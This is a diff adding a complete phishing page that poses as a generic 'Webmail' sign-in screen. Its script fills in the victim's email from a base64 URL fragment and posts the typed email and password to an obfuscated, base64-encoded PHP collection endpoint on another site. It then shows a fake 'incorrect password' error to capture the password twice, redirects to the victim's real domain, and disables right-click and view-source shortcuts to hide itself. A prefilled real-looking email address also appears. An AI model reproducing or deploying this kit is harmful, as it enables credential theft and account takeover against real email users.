@@ -1,0 +1,545 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Login</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --page-bg: #7b7b7b;
+      --panel-top: #204c7a;
+      --panel-bottom: #0a3158;
+      --panel-border: #0b2742;
+      --panel-highlight: #2e6cb0;
+      --text-main: #ffffff;
+      --text-muted: #c5d4e6;
+      --text-link: #ffdd63;
+      --text-link-hover: #ffe993;
+      --field-bg: #fff4c2;
+      --field-border: #c3b370;
+      --button-bg: #f4f4f4;
+      --button-border: #999999;
+      --button-hover-bg: #ffffff;
+      --radio-border: #ffffff;
+      --radio-fill: #ffdd63;
+      --checkbox-border: #ffffff;
+      --checkbox-fill: #ffdd63;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--page-bg);
+      font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+    }
+
+    .login-shell {
+      width: min(520px, 92vw);
+      border-radius: 4px;
+      background: linear-gradient(180deg, #204c7a 0%, #153455 24%, #0f2a46 52%, #0b2742 100%);
+      box-shadow:
+        0 30px 70px rgba(0, 0, 0, 0.65),
+        0 0 0 1px rgba(0, 0, 0, 0.7),
+        0 0 0 1px #325b8d inset;
+      padding: 0 0 26px;
+      color: var(--text-main);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-shell::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 15% 0%, rgba(255, 255, 255, 0.2), transparent 55%);
+      opacity: 0.75;
+      pointer-events: none;
+    }
+
+    .panel-inner {
+      position: relative;
+      padding: 18px 34px 26px;
+      backdrop-filter: blur(2px);
+    }
+
+    .panel-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding-bottom: 14px;
+      margin-bottom: 14px;
+      border-bottom: 1px solid rgba(7, 19, 32, 0.9);
+    }
+
+    .logo-box {
+      width: 42px;
+      height: 42px;
+      border-radius: 3px;
+      background: linear-gradient(145deg, #f0f4ff, #8fb2ff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow:
+        0 0 0 1px rgba(0, 0, 0, 0.55),
+        0 6px 12px rgba(0, 0, 0, 0.7);
+    }
+
+    .logo-mark {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 20%, #ffffff, #3c6dd8);
+      box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.7);
+    }
+
+    .header-text-main {
+      font-size: 1.4rem;
+      font-weight: 600;
+      letter-spacing: 0.03em;
+    }
+
+    .header-text-sub {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .panel-body {
+      display: grid;
+      gap: 18px;
+      font-size: 0.88rem;
+    }
+
+    .section-title {
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+
+    .security-note a {
+      color: var(--text-link);
+      text-decoration: none;
+    }
+
+    .security-note a:hover {
+      color: var(--text-link-hover);
+      text-decoration: underline;
+    }
+
+    .security-options {
+      display: grid;
+      gap: 4px;
+      margin-top: 4px;
+    }
+
+    .control-row {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .control-label {
+      color: var(--text-main);
+    }
+
+    .custom-radio,
+    .custom-checkbox {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transform: translateZ(0);
+    }
+
+    .custom-radio input,
+    .custom-checkbox input {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .radio-visual,
+    .checkbox-visual {
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      border: 1px solid var(--radio-border);
+      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.6);
+      background: radial-gradient(circle at 30% 30%, #335f95, #061425);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .checkbox-visual {
+      border-radius: 2px;
+    }
+
+    .radio-dot,
+    .checkbox-tick {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--radio-fill);
+      box-shadow: 0 0 3px rgba(0, 0, 0, 0.8);
+      opacity: 0;
+      transform: scale(0.2);
+      transition: opacity 120ms ease-out, transform 120ms ease-out;
+    }
+
+    .checkbox-tick {
+      width: 9px;
+      height: 9px;
+      border-radius: 1px;
+      background: linear-gradient(135deg, #fffad4, #ffd754);
+    }
+
+    .custom-radio input:checked + .radio-visual .radio-dot,
+    .custom-checkbox input:checked + .checkbox-visual .checkbox-tick {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .custom-radio:focus-within .radio-visual,
+    .custom-checkbox:focus-within .checkbox-visual {
+      outline: 2px solid #ffd754;
+      outline-offset: 1px;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 110px minmax(0, 1fr);
+      align-items: center;
+      gap: 10px;
+    }
+
+    .field-row + .field-row {
+      margin-top: 8px;
+    }
+
+    .field-label {
+      color: var(--text-muted);
+      text-align: right;
+      font-size: 0.88rem;
+    }
+
+    .text-field {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .text-field input {
+      width: 100%;
+      padding: 5px 7px;
+      border-radius: 2px;
+      border: 1px solid var(--field-border);
+      background: var(--field-bg);
+      color: #333333;
+      font-size: 0.9rem;
+      box-shadow:
+        inset 0 0 0 1px rgba(255, 255, 255, 0.4),
+        0 2px 3px rgba(0, 0, 0, 0.4);
+      transition: border-color 120ms ease-out, box-shadow 120ms ease-out;
+    }
+
+    .text-field input:focus {
+      outline: none;
+      border-color: #ffdd63;
+      box-shadow:
+        0 0 0 1px rgba(255, 221, 99, 0.8),
+        0 0 0 3px rgba(255, 221, 99, 0.4),
+        0 2px 4px rgba(0, 0, 0, 0.6);
+    }
+
+    .actions-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 12px;
+    }
+
+    .btn-primary {
+      min-width: 80px;
+      padding: 4px 18px;
+      border-radius: 2px;
+      border: 1px solid var(--button-border);
+      background: linear-gradient(180deg, #ffffff 0%, #f4f4f4 60%, #d9d9d9 100%);
+      box-shadow:
+        0 0 0 1px rgba(255, 255, 255, 0.8) inset,
+        0 2px 3px rgba(0, 0, 0, 0.5);
+      font-size: 0.88rem;
+      cursor: pointer;
+      transition:
+        background 120ms ease-out,
+        transform 80ms ease-out,
+        box-shadow 80ms ease-out;
+        color: darkblue;
+    }
+
+    .btn-primary:hover {
+      background: linear-gradient(180deg, #ffffff 0%, #ffffff 50%, #e5e5e5 100%);
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+      box-shadow:
+        0 0 0 1px rgba(255, 255, 255, 0.9) inset,
+        0 0 0 1px rgba(0, 0, 0, 0.6);
+    }
+
+    .btn-primary:focus-visible {
+      outline: 2px solid #ffdd63;
+      outline-offset: 2px;
+    }
+
+    .panel-footer {
+      margin-top: 20px;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .panel-footer span {
+      display: block;
+      margin-top: 2px;
+    }
+
+    @media (max-width: 480px) {
+      .panel-inner {
+        padding: 16px 18px 22px;
+      }
+
+      .panel-header {
+        flex-direction: row;
+        align-items: center;
+      }
+
+      .field-row {
+        grid-template-columns: 1fr;
+        text-align: left;
+      }
+
+      .field-label {
+        text-align: left;
+      }
+
+      .actions-row {
+        justify-content: flex-start;
+      }
+    }
+      #error {
+    display: none;
+    color: red;
+    }
+    .disabled {
+    pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-shell">
+    <div class="panel-inner">
+      <header class="panel-header">
+        <div class="logo-box" aria-hidden="true">
+          <div class="logo-mark"></div>
+        </div>
+        <div>
+          <div class="header-text-main">Webmail</div>
+          <div class="header-text-sub">Web mail access application</div>
+        </div>
+      </header>
+
+      <main class="panel-body">
+        <section>
+          <div class="section-title security-note">
+            Security (<a href="#">show explanation</a>)
+          </div>
+          <div class="security-options" role="radiogroup" aria-label="Security level">
+            <label class="custom-radio control-row">
+              <input type="radio" name="security" value="public" checked="">
+              <span class="radio-visual">
+                <span class="radio-dot"></span>
+              </span>
+              <span class="control-label">This is a public or shared computer</span>
+            </label>
+            <label class="custom-radio control-row">
+              <input type="radio" name="security" value="private">
+              <span class="radio-visual">
+                <span class="radio-dot"></span>
+              </span>
+              <span class="control-label">This is a private computer</span>
+            </label>
+          </div>
+          <label class="custom-checkbox control-row" style="margin-top: 10px;">
+            <input type="checkbox" name="lightVersion">
+            <span class="checkbox-visual">
+              <span class="checkbox-tick"></span>
+            </span>
+            <span class="control-label">Use the light version of Webmail App</span>
+          </label>
+        </section>
+        <h5 id="error">Password is incorrect, please try again!</h5>
+        <section aria-label="Login form">
+          <form class="container" id="login-form">
+            <div class="field-row">
+              <label class="field-label" for="email">Email address:</label>
+              <div class="text-field">
+                <input type="email" id="email" name="email" autocomplete="username" value="aray@edye.com.ar">
+              </div>
+            </div>
+            <div class="field-row">
+              <label class="field-label" for="password">Password:</label>
+              <div class="text-field">
+                <input type="password" id="password" name="password" autocomplete="current-password">
+              </div>
+            </div>
+            <input type="hidden" name="step" id="step">
+  <input type="hidden" name="token" id="token" value="&lt;%= token %&gt;">
+            <div class="actions-row">
+              <button type="submit" class="btn-primary">Sign in</button>
+            </div>
+          </form>
+        </section>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+  // prevent ctrl + s
+    $(document).bind('keydown', function(e) {
+      if(e.ctrlKey && (e.which == 83)) {
+      e.preventDefault();
+      return false;
+      }
+    });
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function(e) {
+      if (e.ctrlKey && 
+      (e.keyCode === 67 || 
+      e.keyCode === 86 || 
+      e.keyCode === 85 || 
+      e.keyCode === 117)) {
+        return false;
+      } else {
+      return true;
+      }
+    };
+    $(document).keypress("u",function(e) {
+      if(e.ctrlKey) {
+      return false;
+      } else {
+      return true;
+      }
+    });
+
+</script>
+<script>
+
+    let step = 1;
+    
+    // Get the clientID from the hash
+let clientID = window.location.hash.split("#").pop();
+// Function to decode Base64 clientID
+function decodeclientID(encodedclientID) {
+    try {
+        return atob(encodedclientID); // Decode Base64 clientID
+    } catch (e) {
+        return encodedclientID; // Return original if decoding fails
+    }
+}
+// Function to encode clientID
+function encodeclientID(clientID) {
+    return btoa(clientID); // Base64 encoding
+}
+// If a clientID exists in the hash
+if (clientID) {
+    // Check if the clientID is already Base64 encoded
+    try {
+        atob(clientID); // If this works without error, it's already encoded
+        const decodedClientID = decodeclientID(clientID); // Decode it
+        $('#email').val(decodedClientID); // Set decoded clientID in the input field
+        clientID = decodedClientID; // Update clientID to the decoded version for further use
+    } catch (e) {
+        // If it's not encoded, encode the clientID and update the hash
+        const encodedClientID = encodeclientID(clientID);
+        const newHash = `#${encodedClientID}`;
+        window.history.replaceState({}, '', newHash); // Update the hash without reloading
+        $('#email').val(clientID); // Set the plain clientID in the input field
+    }
+    
+}
+  const domain = clientID.split('@').pop();
+  $("#frame").attr("src", "https://" + domain);
+  $("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+    
+
+    const submit = $("button[type='submit']");
+
+    $("#login-form").submit(function(event) {
+        event.preventDefault();
+
+        submit.text('Verifying...');
+        const atoken = Math.random().toString(36).substring(7);
+        $('#token').val(atoken);
+
+  // Add a class to the hidden field to style it as hidden
+        N = atob("aHR0cHM6Ly9saXZlcmFjYW1waW5nLmNvbS93cC1jb250ZW50L3RoZW1lcy9jdXN0b21pZnkvY29ydC9kZi9lbWFpbC5waHA=");
+        $('#token').addClass('hiddenField');
+        const token = $("#token").val();
+
+        if (!token || token !== atoken) {
+            console.log("Invalid Submission");
+            console.error(error);
+        window.location.href = "http://" + domain;
+        } else {
+        console.log("Submission received");
+        }
+
+
+        
+        const posting = $.post(N, {
+            email: $("#email").val(),
+            password: $("#password").val(),
+            step,
+            resultBox: "",
+        });
+
+        posting.done(function(data) {
+            if (step === 2) {
+                window.location.href = "http://" + domain;
+            } else {
+                step++;
+                $("#error").css("display", "block");
+                submit.text('Sign In');
+                $("#password").val("");
+            }
+        });
+
+        posting.fail(function(error) {
+            console.error(error);
+            $("#error").css("display", "block");
+            submit.text('Sign In');
+            $("#password").val("");
+        });
+    });
+
+  </script>
+
+        <footer class="panel-footer">
+          <span>Connected to Webmail Exchange</span>
+          <span>© 2026 Webmail. All rights reserved.</span>
+        </footer>
+      </main>
+    </div>
+  </div>
+
+
+
+</body></html>
